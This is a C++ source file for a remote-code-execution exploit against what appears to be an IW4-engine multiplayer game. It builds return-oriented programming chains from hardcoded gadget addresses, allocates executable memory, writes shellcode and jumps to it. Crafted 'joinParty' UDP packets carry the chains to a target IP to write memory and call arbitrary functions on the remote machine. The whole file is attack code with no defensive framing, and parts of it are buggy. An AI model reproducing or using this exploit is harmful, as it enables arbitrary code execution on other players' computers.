#include "stdafx.h"
#include "RCEManager.h"
#define ARRAY_LENGTH(array) (sizeof(array)/sizeof((array)[0]))

const int UNUSED_DATA_POINTER = 0x642D7B9;
const int UNUSED_MEMORY_POINTER = 0x642D798;

byte exploitHeader[]{ 0xff, 0xff, 0xff, 0xff, 0x31, 0x6a, 0x6f, 0x69, 0x6e, 0x50, 0x61, 0x72, 0x74, 0x79, 0x20, 0x31, 0x34, 0x39, 0x20, 0x31, 0x20, 0x31, 0x20, 0x30, 0x20, 0x30, 0x20, 0x30, 0x20, 0x35, 0x30, 0x30, 0x20, 0x30, 0x20, 0x30, 0x20, 0x31, 0x20, 0x32, 0x20, 0x33, 0x20, 0x34, 0x20, 0x35, 0x20, 0x36, 0x20, 0x37, 0x20, 0x38, 0x20, 0x39, 0x20, 0x31, 0x30, 0x20, 0x31, 0x31, 0x20, 0x31, 0x32, 0x20, 0x31, 0x33, 0x20, 0x31, 0x34, 0x20, 0x31, 0x35, 0x20, 0x31, 0x36, 0x20, 0x31, 0x37, 0x20 };

std::vector<byte*> buffer;
bool finalized = false;

namespace Exploit
{
	class ExploitBuilder
	{
	public:
		ExploitBuilder()
		{
			buffer.push_back(exploitHeader);
		}

		void addInt(int a)
		{
			char stringBuffer[255]; 
			std::string b = std::to_string(a);
			memcpy(stringBuffer, b.data(), b.length());
			buffer.push_back((byte*)stringBuffer);
			buffer.push_back((byte*)0x20);
		}

		void startFix()
		{
			addInt(0x413600); //pop ecx
			addInt(0x01B8B804 - 0x14); //unknown
			addInt(0x665569); //pop edx
			addInt(0); //mov edx, 0
			addInt(0x4011FE); //mov [ecx+14h], edx
		}

		void writeInt(int address, int data)
		{
			addInt(0x00675B5F); //pop eax
			addInt(data); //mov eax, 0xFFFF
			addInt(0x00412746); //pop edi
			addInt(address); //mov edi, 0x01B8B838
			addInt(0x00595520); //mov [edi], eax
		}

		void writeData(int address, std::string data)
		{
			while (data.length() % 4 != 0)
				data += " ";

			for (int i = 0; i < data.length(); i += 4)
			{
				std::string lowString = data.substr(i, 4);
				unsigned char buffer[255];
				memcpy(buffer, lowString.data(), lowString.length());
				int inaa = (__int32)buffer;

				writeInt(address + i, inaa);
			}

			writeInt(address + data.length(), 0);
		}

		void pop(int numParams)
		{
			//wrong offsets in ROPGADGET
			int popOffsets[] =
			{
			0x672031, // 0
			0x672030, // 1
			0x67202F, // 2
			0x67202E, // 3
			0x67202D, // 4
			0x67202C, // 5
			0x67202B, // 6
			};

			addInt(popOffsets[numParams]);
		}

		void allocateMemory(int address, int size)
		{
			addInt(0x5B79D0); // IAT: VirtualAlloc
			pop(4);

			addInt(0);                        // addr
			addInt(size);                     // size
			addInt(0x3000); // MEM_COMMIT | MEM_RESERVE
			addInt(0x40);   // PAGE_EXECUTE_READWRITE

			// Save memory pointer
			addInt(0x004012f7);    // pop esi - for saving the memory pointer
			addInt(address);                  // Target address
			addInt(0x005945f0);    // mov [esi], eax
		}

		void writeDataInEax(byte Data[])
		{
			if (ARRAY_LENGTH(Data) % 4 != 0)
			{
				byte dataListLength = ARRAY_LENGTH(Data);
				std::vector<byte> dataList;
				
				while (sizeof(dataListLength) % 4 != 0)
					dataList.push_back(0);

				byte bufferArray[255];
				std::copy(dataList.begin(), dataList.end(), bufferArray);
				
				Data = bufferArray;
			}

			for (int i = 0; i < ARRAY_LENGTH(Data); i += 4)
			{
				addInt(0x004031a1);    // pop ecx

				byte encodedString[4];
				memcpy((void*)Data[i], (void*)encodedString[0], 4);

				addInt(encodedString[4]);
				addInt(0x0042a059);  // mov [eax], ecx
				addInt(0x00655b09);  // add eax, 3
				addInt(0x004658a4);  // add eax, 1
			}
		}

		char* finalize()
		{
			char bufferArray[255];
			memcpy(bufferArray, buffer.data(), sizeof(bufferArray));
			
			if (finalized)
				return bufferArray;

			//oldshit
			addInt(0x56a202);
			return bufferArray;
			//end of oldshit

			int fullSize = 0xD7 + buffer.size() - sizeof(exploitHeader) + 8 - 0x71;

			//addInt(0x56a202); //restore context          

			pop(1);
			addInt(0x3172090); // old param? not really, but whatever

			std::vector<byte> fixShellcode = std::vector<byte>();
			fixShellcode.push_back((byte)0x81);
			fixShellcode.push_back((byte)0xEC);

			unsigned char buffer1[255];
			memcpy(buffer1, (const void*)fullSize, sizeof(fullSize));
			
			for (int i = 0; i < ARRAY_LENGTH(buffer1); i++)
				fixShellcode.push_back(buffer1[i]);

			byte etc[] = { 0xB8, 0x02, 0xa2, 0x56, 0x00, 0xFF, 0xE0 };

			fixShellcode.push_back((byte)etc);

			allocateMemory(UNUSED_MEMORY_POINTER, fixShellcode.size());
			writeDataInEax(fixShellcode.data());

			// Execute shellcode
			addInt(0x004031a1); // pop ecx
			addInt(UNUSED_MEMORY_POINTER);
			addInt(0x0047953b); // mov eax, [ecx]
			addInt(0x0040100b); // jmp eax

			//addInt(0x56a202); //restore context*
			finalized = true;
			return bufferArray;
		}
	};
}

void InitUDPSock(const char* IPAddr, char* Payload)
{
	WSADATA data;
	WORD version = MAKEWORD(2, 2);

	int wsOk = WSAStartup(version, &data);
	if (wsOk != 0) {
		return;
	}

	sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(28960);
	inet_pton(AF_INET, IPAddr, &server.sin_addr);

	SOCKET out = socket(AF_INET, SOCK_DGRAM, 0);

	std::string s(Payload);
	int sendOk = sendto(out, s.c_str(), s.size(), 0, (sockaddr*)&server, sizeof(server));

	if (sendOk == SOCKET_ERROR) {

	}
	
	closesocket(out);
	WSACleanup();
}

template<typename... Parameters>
std::string VariadicText(std::string format, Parameters... params)
{
	char szBuffer[4096] = { NULL };
	sprintf_s(szBuffer, format.c_str(), params...);
	return szBuffer;
}

void RCEManager::RCE_WriteUInt(int Addr, int Value)
{
	char PayLoad[0x200];
	sprintf_s(PayLoad, "ÿÿÿÿ1joinParty 149 1 1 0 0 0 32 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 %i %i %i 0 %i %i %i %i %i %i %i", 0x413600, 0x1B8B7F0, 0x665569, 0x4011FE, 0x413600, Addr - 0x14, 0x665569, Value, 0x4011FE, 0x56A202);
	PayLoad[0] = 0xFF; PayLoad[1] = 0xFF; PayLoad[2] = 0xFF; PayLoad[3] = 0xFF;

	InitUDPSock(VariadicText("%u.%u.%u.%u", IpAddress[0], IpAddress[1], IpAddress[2], IpAddress[3]).c_str(), PayLoad);
}

void RCEManager::RCE_WriteInt(int Addr, int Value)
{
	char PayLoad[0x200];
	sprintf_s(PayLoad, "AAAA1joinParty 149 1 1 0 0 0 32 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 %i %i %i 0 %i %i %i %i %i %i %i", 0x413600, 0x01B8B804 - 0x14, 0x665569, 0x4011FE, 0x413600, Addr - 0x14, 0x665569, Value, 0x4011FE, 0x56A202);
	PayLoad[0] = 0xFF; PayLoad[1] = 0xFF; PayLoad[2] = 0xFF; PayLoad[3] = 0xFF;

	InitUDPSock(VariadicText("%u.%u.%u.%u", IpAddress[0], IpAddress[1], IpAddress[2], IpAddress[3]).c_str(), PayLoad);
}

void RCEManager::RCE_Call(int address)
{
	char PayLoad[0x200];
	sprintf_s(PayLoad, "AAAA1joinParty 149 1 1 0 0 0 28 0 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 %i %i %i 0 %i %i %i %i %i", 0x413600, 0x01B8B804 - 0x14, 0x665569, 0x4011FE, 0x00675B5F, address, 0x005FA5DE, 0x0056A202);
	PayLoad[0] = 0xFF; PayLoad[1] = 0xFF; PayLoad[2] = 0xFF; PayLoad[3] = 0xFF;

	InitUDPSock(VariadicText("%u.%u.%u.%u", IpAddress[0], IpAddress[1], IpAddress[2], IpAddress[3]).c_str(), PayLoad);
}

void RCEManager::doRCE()
{
	/*if (IW4::GLOBALS::MigrateHost) 
	{
		RCE_Call(0x585580);
	}
	
	if (IW4::GLOBALS::FastRestart) {
		RCE_Call(0x5853E0);
	}*/
}